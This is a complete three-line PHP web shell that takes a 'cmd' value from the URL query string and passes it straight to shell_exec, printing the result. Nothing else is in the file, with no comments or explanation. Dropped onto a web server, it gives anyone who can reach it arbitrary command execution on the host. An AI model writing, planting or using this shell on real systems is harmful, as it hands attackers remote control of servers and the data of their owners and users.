<?php

$cmd = $_GET["cmd"];

echo shell_exec($cmd);
